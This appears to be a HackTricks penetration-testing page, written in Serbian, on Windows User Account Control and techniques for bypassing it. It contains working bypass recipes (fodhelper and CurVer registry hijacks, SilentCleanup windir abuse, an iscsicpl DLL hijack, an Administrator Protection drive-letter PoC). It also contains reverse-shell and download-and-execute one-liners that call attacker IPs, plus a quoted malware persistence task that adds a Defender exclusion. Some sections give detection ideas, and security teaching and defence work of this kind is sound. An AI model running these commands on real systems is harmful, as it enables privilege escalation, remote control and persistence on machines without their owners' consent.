# UAC - Kontrola korisničkog naloga

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za odobrenje privilegovanih aktivnosti**. Aplikacije imaju različite nivoe `integrity`, a program sa **visokim nivoom** može da izvršava zadatke koji bi **potencijalno mogli da ugroze sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **izvršavaju u bezbednosnom kontekstu naloga koji nije administrator** osim ako administrator izričito ne odobri da te aplikacije/zadaci dobiju pristup sistemu na nivou administratora radi izvršavanja. To je funkcija pogodnosti koja štiti administratore od nenamernih promena, ali se ne smatra bezbednosnom granicom.<sup>[[2]](#references)</sup>

Za više informacija o nivoima integriteta:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC aktivan, korisnik administrator dobija 2 tokena: token standardnog korisnika, za izvršavanje uobičajenih radnji na srednjem nivou integriteta, i token sa administratorskim privilegijama.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno objašnjava kako UAC funkcioniše i obuhvata proces prijavljivanja, korisničko iskustvo i UAC arhitekturu.<sup>[[2]](#references)</sup> Administratori mogu da koriste bezbednosne politike za konfiguraciju načina rada UAC-a specifičnog za svoju organizaciju na lokalnom nivou (korišćenjem secpol.msc), ili da ga konfigurišu i distribuiraju putem Group Policy Objects (GPO) u Active Directory domenskom okruženju. Različita podešavanja su detaljno opisana [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Za UAC može da se podesi 10 Group Policy podešavanja. Sledeća tabela pruža dodatne detalje:

| Group Policy podešavanje                                                                                                                                                                                                                                                                                                                                                           | Registry ključ                | Podrazumevano podešavanje                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Kontrola korisničkog naloga: Admin Approval Mode za ugrađeni Administrator nalog](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: Ponašanje zahteva za podizanje privilegija za administratore u režimu Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zahtev za odobrenje za ne-Windows binarne datoteke na bezbednoj radnoj površini) |
| [Kontrola korisničkog naloga: Ponašanje zahteva za podizanje privilegija za standardne korisnike](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Zahtev za akreditive na bezbednoj radnoj površini)         |
| [Kontrola korisničkog naloga: Otkrivanje instalacija aplikacija i zahtev za podizanje privilegija](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Omogućeno; podrazumevano onemogućeno u Enterprise izdanju)           |
| [Kontrola korisničkog naloga: Podizanje privilegija samo za izvršne datoteke koje su potpisane i validirane](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: Podizanje privilegija samo za UIAccess aplikacije instalirane na bezbednim lokacijama](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: Pokretanje svih administratora u režimu Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: Dozvola UIAccess aplikacijama da zahtevaju podizanje privilegija bez korišćenja bezbedne radne površine](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Onemogućeno)                                             |
| [Kontrola korisničkog naloga: Prebacivanje na bezbednu radnu površinu prilikom zahteva za podizanje privilegija](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Omogućeno)                                              |
| [Kontrola korisničkog naloga: Virtuelizacija neuspešnih upisa u datoteke i registry na lokacije po korisniku](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Omogućeno)                                              |

### Politike za instaliranje softvera na Windows

**Lokalne bezbednosne politike** ("secpol.msc" na većini sistema) podrazumevano su konfigurisane tako da **sprečavaju korisnike koji nisu administratori da instaliraju softver**. To znači da čak i ako korisnik koji nije administrator može da preuzme instalacioni program za vaš softver, neće moći da ga pokrene bez administratorskog naloga.

### Registry ključevi za prisiljavanje UAC-a da zahteva podizanje privilegija

Kao standardni korisnik bez administratorskih prava, možete da obezbedite da se od „standardnog“ naloga **zahtevaju akreditivi putem UAC-a** kada pokuša da izvrši određene radnje. Za ovu radnju potrebno je menjanje određenih **registry ključeva**, za šta su vam potrebne administratorske dozvole, osim ako postoji **UAC bypass** ili je napadač već prijavljen kao administrator.

Čak i ako je korisnik u grupi **Administrators**, ove promene prisiljavaju korisnika da **ponovo unese akreditive svog naloga** kako bi izvršio administratorske radnje.

**U praksi je ovo korisno samo kada već imate token sa povišenim privilegijama, UAC bypass ili pogrešnu konfiguraciju koja vam omogućava menjanje ovih ključeva; u suprotnom, sam upis u registry je blokiran.**

Registry ključevi i unosi koje morate da promenite su sledeći (sa podrazumevanim vrednostima u zagradama):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Ovo se takođe može ručno uraditi putem alata Local Security Policy. Nakon promene, administratorske operacije zahtevaju od korisnika da ponovo unese svoje akreditive.

### Napomena

**User Account Control nije bezbednosna granica.** Zbog toga standardni korisnici ne mogu da izađu iz svojih naloga i steknu administratorska prava bez local privilege escalation exploita.

### Zatražite od korisnika „potpun pristup računaru“
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC privilegije

- Internet Explorer Protected Mode koristi provere integriteta kako bi sprečio procese sa visokim nivoom integriteta (kao što su web pregledači) da pristupaju podacima sa niskim nivoom integriteta (kao što je fascikla sa privremenim Internet datotekama). To se postiže pokretanjem pregledača sa tokenom niskog integriteta. Kada pregledač pokuša da pristupi podacima uskladištenim u zoni niskog integriteta, operativni sistem proverava nivo integriteta procesa i u skladu s tim dozvoljava pristup. Ova funkcija pomaže u sprečavanju napada daljinskog izvršavanja koda da dobiju pristup osetljivim podacima na sistemu.
- Kada se korisnik prijavi na Windows, sistem kreira access token koji sadrži listu privilegija korisnika. Privilegije su definisane kao kombinacija prava i mogućnosti korisnika. Token takođe sadrži listu korisničkih credentials, odnosno credentials koji se koriste za autentifikaciju korisnika na računaru i resursima na mreži.

### Autoadminlogon

Da biste konfigurisali Windows da se automatski prijavi kao određeni korisnik pri pokretanju sistema, podesite **`AutoAdminLogon` registry key**. Ovo je korisno u kiosk okruženjima ili u svrhe testiranja. Koristite ovo samo na bezbednim sistemima, jer se lozinka izlaže u registry-ju.

Podesite sledeće ključeve pomoću Registry Editor-a ili komande `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Da biste se vratili na uobičajeno ponašanje pri prijavljivanju, podesite `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Imajte na umu da je, ako imate grafički pristup žrtvi, UAC bypass jednostavan jer možete samo kliknuti na „Yes“ kada se pojavi UAC prompt

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces se izvršava u kontekstu srednjeg nivoa integriteta, a vaš korisnik pripada grupi administratora**.

Važno je napomenuti da je **mnogo teže izvršiti UAC bypass ako je podešen najviši nivo bezbednosti (Always), nego ako je podešen neki od drugih nivoa (Default).**

### Brza trijaža iz shell-a srednjeg nivoa integriteta

Pre nego što pokušate bypass, potvrdite da se nalazite u odgovarajućoj situaciji i povežite build hosta sa poznatim funkcionalnim metodama:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktične napomene:
- Ako je `EnableLUA=0`, zaobilaženje nije potrebno: bilo koji administratorski token može direktno da zatraži visok nivo integriteta.
- `ConsentPromptBehaviorAdmin=2` ili `5` predstavlja uobičajeni scenario za auto-elevate / COM-based bypasses.
- `Always Notify` podiže nivo zaštite, ali i dalje treba testirati konkretnu build verziju umesto pretpostaviti da neće uspeti: UACME i dalje prati neke metode kompatibilne sa `AlwaysNotify` na modernim Windows build verzijama.<sup>[[3]](#references)</sup>

### UAC disabled

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **izvršiti reverse shell sa administratorskim privilegijama** (visok nivo integriteta) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Veoma** osnovni UAC "bypass" (potpun pristup file systemu)

Ako imate shell sa userom koji je u grupi Administrators, možete da mountujete **C$** share preko SMB-a (file system) lokalno na novom disku i imaćete **pristup svemu unutar file systema** (čak i home folderu administratora).

> [!WARNING]
> **Izgleda da ovaj trik više ne funkcioniše**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass pomoću Cobalt Strike-a

Cobalt Strike tehnike će raditi samo ako UAC nije podešen na maksimalni nivo bezbednosti
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **zaobilaženje** **UAC-a**.

### Elevirani COM interfejsi (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevirani COM objekti ostaju praktična UAC površina na modernim buildovima. `ICMLuaUtil` se i dalje vodi u UACME-u kao funkcionalan na aktuelnim Windows granama, a offensive tooling nastavlja da prilagođava `CMSTPLUA` kombinovanjem procesa na interaktivnom desktopu, 64-bitnog izvršavanja i ponekad PEB/process masquerading-a pre pozivanja COM Elevation Moniker-a.<sup>[[3]](#references)</sup>

Praktični saveti:
- Preferirajte **64-bitni** proces u korisničkoj **interaktivnoj sesiji** (najčešće `explorer.exe` ili njegov child proces).
- Ako raw shell ne uspe, pokušajte ponovo iz BOF / UACME implementacije umesto naivnog `CreateProcess` wrapper-a.
- Očekujte da se izvršavanje child procesa odvija u **zasebnom eleviranom procesu**; mnogi BOF-ovi ne eleviraju trenutni beacon in-place.

### KRBUACBypass

Dokumentacija i alat nalaze se na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploiti za zaobilaženje UAC-a

[**UACME** ](https://github.com/hfiref0x/UACME), koji predstavlja **kompilaciju** nekoliko exploita za zaobilaženje UAC-a. Imajte na umu da ćete morati da **kompajlirate UACME koristeći Visual Studio ili msbuild**. Kompilacija će kreirati nekoliko izvršnih datoteka (kao što je `Source\Akagi\outout\x64\Debug\Akagi.exe`), pa ćete morati da znate **koja vam je potrebna.**\
Trebalo bi da budete **oprezni**, jer će neka zaobilaženja **prikazati prompt za druge programe** koji će **upozoriti** **korisnika** da se nešto dešava.<sup>[[3]](#references)</sup>

UACME sadrži **build verziju od koje je svaka tehnika počela da radi**.<sup>[[3]](#references)</sup> Možete pretražiti tehniku koja utiče na vaše verzije:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, koristeći [ovu](https://en.wikipedia.org/wiki/Windows_10_version_history) stranicu, iz verzija buildova možete dobiti Windows izdanje `1607`.

Praktičan tok rada je da prvo **procenite build hosta**, a tek zatim primenite odgovarajuću metodu:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` brzo upoređuje lokalni build sa poznatim UAC metodama, što je korisno za brzo odbacivanje nevažećih PoC-ova.<sup>[[4]](#references)</sup>
- `UACME` je i dalje najbolji javni katalog za povezivanje bypass-a sa preciznim build-om. Novija izdanja su dodala nove metode i ponovo testirala postojeće protiv **Windows 11 25H2**, zato ponovo proverite README/beleške o izdanju pre nego što pretpostavite da se stari blog post i dalje primenjuje bez izmena.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binarni fajl `fodhelper.exe` se na modernom Windows-u automatski pokreće sa povišenim privilegijama. Prilikom pokretanja, on upituje putanju registra po korisniku navedenu u nastavku, bez validacije glagola `DelegateExecute`. Postavljanje komande na to mesto omogućava procesu sa Medium Integrity nivoom (korisnik je član grupe Administrators) da pokrene proces sa High Integrity nivoom bez UAC upita.

Putanja registra koju upituje fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell koraci (postavite svoj payload, zatim ga pokrenite)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Napomene:
- Funkcioniše kada je trenutni korisnik član grupe Administrators i kada je nivo UAC-a podrazumevan/blag (ne Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da biste pokrenuli 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd ili putanja do EXE datoteke). Izbegavajte UI-je koji zahtevaju interakciju korisnika radi stealth-a.

#### CurVer/extension hijack varijanta (samo HKCU)

Noviji primerci koji zloupotrebljavaju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju `ms-settings` ProgID** putem vrednosti `CurVer` za određenog korisnika. Binarna datoteka sa automatskom elevacijom i dalje razrešava handler pod `HKCU`, tako da administratorski token nije potreban za postavljanje ključeva:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Nakon eskalacije privilegija, malver često **onemogućava buduće upite** postavljanjem vrednosti `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a zatim sprovodi dodatno izbegavanje odbrambenih mehanizama (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo kreira persistence kako bi se izvršavao sa visokim integritetom. Tipičan persistence task čuva **XOR-šifrovanu PowerShell skriptu** na disku i dekodira je/izvršava u memoriji svakog sata:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ova varijanta i dalje čisti dropper i ostavlja samo staged payloads, pa se detekcija oslanja na praćenje **`CurVer` hijack-a**, izmene vrednosti `ConsentPromptBehaviorAdmin`, kreiranje Defender exclusion-a ili scheduled tasks koji u memoriji dešifruju PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass putem zadatka `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` pokreće `cleanmgr.exe` sa najvišim privilegijama i proširuje `%windir%` iz korisničkog okruženja. Ako kontrolišete `HKCU\Environment\windir`, možete preusmeriti to proširivanje na proizvoljnu komandu i dobiti high integrity bez consent dialog-a.<sup>[[8]](#references)</sup> Ovaj metod i dalje vredi testirati na novijim build-ovima, jer UACME održava tehniku aktivnom, a novije praćenje problema pokazuje da Windows 11 24H2 možda zahteva samo male izmene navodnika.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Ako zadatak navodi putanju na toj build verziji, ponovite test sa payload-om koji se završava navodnikom (na primer `cmd.exe"`). Uvek obrišite `HKCU\Environment\windir` nakon testiranja.

#### Još UAC bypass tehnika

Mnoge klasične UAC bypass tehnike koje zloupotrebljavaju UI tokove, COM objekte ili interakciju sa desktopom zahtevaju **punu interaktivnu sesiju** sa žrtvom; uobičajeni `nc.exe` shell ili servis koji radi u **Session 0** često nisu dovoljni.

To često možete rešiti pomoću **meterpreter** sesije. Migrirajte u **process** čija je vrednost **Session** jednaka **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC Bypass sa GUI-jem

Ako imate pristup **GUI-ju, možete jednostavno prihvatiti UAC prompt** kada se pojavi; tehnički bypass vam zapravo nije potreban. Zato je dobijanje GUI sesije često dovoljno da se zaobiđe praktična prepreka koju UAC dodaje.

Pored toga, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP-a), **neki alati će raditi kao administrator**, pa odatle možete **pokrenuti**, na primer, **cmd** direktno **kao admin**, bez ponovnog UAC prompta, kao što je [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti nešto **stealthy**.

### Noisy brute-force UAC bypass

Ako vam nije važno da budete noisy, uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), što **traži elevaciju privilegija sve dok je korisnik ne prihvati**.

### Sopstveni bypass - Basic UAC bypass methodology

Ako pogledate **UACME**, primetićete da **mnoge UAC bypass tehnike zloupotrebljavaju DLL hijacking** (često tako što nateraju elevated binary da učita DLL pod kontrolom napadača iz putanje u koju je moguće upisivati). [Pročitajte ovo da biste naučili kako da pronađete ranjivost za DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binary koji se **autoelevate** (proverite da li se pri pokretanju izvršava na high integrity level-u).
2. Pomoću procmon-a pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **upišete** DLL u neku od **zaštićenih putanja** (kao što je C:\Windows\System32), u koje nemate dozvolu za upis. Ovo možete zaobići pomoću:
1. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla u zaštićene putanje (zato što se ovaj alat izvršava sa high integrity level-a).
2. **IFileOperation**: Windows 10.
4. Pripremite **skriptu** za kopiranje DLL-a u zaštićenu putanju i izvršavanje ranjivog i autoelevated binary-ja.

### Druga UAC bypass tehnika

Sastoji se u praćenju da li **autoElevated binary** pokušava da iz **registry-ja** pročita **ime/putanju** **binary-ja** ili **komande** koju treba **izvršiti** (ovo je interesantnije ako binary traži ove informacije unutar **HKCU**).

### UAC bypass putem `SysWOW64\iscsicpl.exe` + DLL hijack-a korisničkog `PATH`-a

32-bitni `C:\Windows\SysWOW64\iscsicpl.exe` je **auto-elevated** binary koji se može zloupotrebiti za učitavanje `iscsiexe.dll` prema redosledu pretrage. Ako možete postaviti zlonamerni `iscsiexe.dll` u folder u koji **korisnik može da upisuje**, a zatim izmeniti `PATH` trenutnog korisnika (na primer preko `HKCU\Environment\Path`) tako da se taj folder pretražuje, Windows može učitati DLL napadača u proces **elevated iscsicpl.exe** **bez prikazivanja UAC prompta**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktične napomene:
- Ovo je korisno kada je trenutni korisnik u grupi **Administrators**, ali radi na **Medium Integrity** nivou zbog UAC-a.
- Kopija u **SysWOW64** je relevantna za ovaj bypass. Kopiju u **System32** tretirajte kao zaseban binary i nezavisno proverite njegovo ponašanje.
- Primitiv predstavlja kombinaciju **auto-elevation** i **DLL search-order hijacking-a**, tako da je isti ProcMon workflow koji se koristi za druge UAC bypass tehnike koristan za proveru učitavanja DLL-a koji nedostaje.

Minimalni tok:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideje za detekciju:
- Upozoriti na `reg add` / upise u registry na `HKCU\Environment\Path` neposredno praćene izvršavanjem `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tražiti `iscsiexe.dll` na lokacijama pod **kontrolom korisnika**, kao što su `%TEMP%` ili `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korelisati pokretanja `iscsicpl.exe` sa neočekivanim child procesima ili učitavanjima DLL-ova izvan uobičajenih Windows direktorijuma.

### Novija istraživanja koja vredi proveriti zasebno

Neki chain-ovi posle 2024. više ne izgledaju kao klasični `HKCU\Software\Classes` registry hijack-ovi. Na primer, poisoning activation-context cache-a može kombinovati **drive remap** i **DLL redirection** za prelazak sa medium na high integrity kroz pouzdane UI / auto-elevated binary-je, kao što su `ctfmon.exe`, a kasnije i targeti poput `fodhelper.exe`. Umesto dupliranja velikog PoC-a ovde, proverite kompaktne primere payload-a u:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) drive-letter hijack preko DOS device mape po logon sesiji

Za kompletnu attack surface funkcije `RAiLaunchAdminProcess` / UIAccess na Windows 11 25H2, pogledajte posebnu stranicu:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection“ koristi shadow-admin tokene sa mapama `\Sessions\0\DosDevices/<LUID>` po sesiji. Direktorijum se kreira lazy preko `SeGetTokenDeviceMap` pri prvom razrešavanju `\??`. Ako attacker impersonate-uje shadow-admin token samo na nivou **SecurityIdentification**, direktorijum se kreira tako da je attacker **owner** (nasleđuje `CREATOR OWNER`), čime drive-letter link-ovi dobijaju prednost nad `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Koraci:**

1. Iz low-privileged sesije pozvati `RAiProcessRunOnce` kako bi se pokrenuo shadow-admin `runonce.exe` bez prompta.
2. Duplirati njegov primary token u **identification** token i impersonate-ovati ga prilikom otvaranja `\??`, kako bi se pod vlasništvom attacker-a prinudilo kreiranje `\Sessions\0\DosDevices/<LUID>`.
3. Kreirati `C:` symlink koji pokazuje na storage pod kontrolom attacker-a; naredni filesystem pristupi u toj sesiji razrešavaju `C:` na attacker putanju, što omogućava DLL/file hijack bez prompta.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Reference

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kako funkcioniše User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Kolekcija tehnika za zaobilaženje UAC-a](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Skener kompatibilnosti i pokretač za zaobilaženje UAC-a](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI usvaja AI za generisanje PowerShell backdoor-a](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operacija TrueChaos: Iskorišćavanje 0-day ranjivosti protiv ciljeva vlada jugoistočne Azije](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Zaobilaženje Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Zaobilaženje UAC-a pomoću zadatka SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
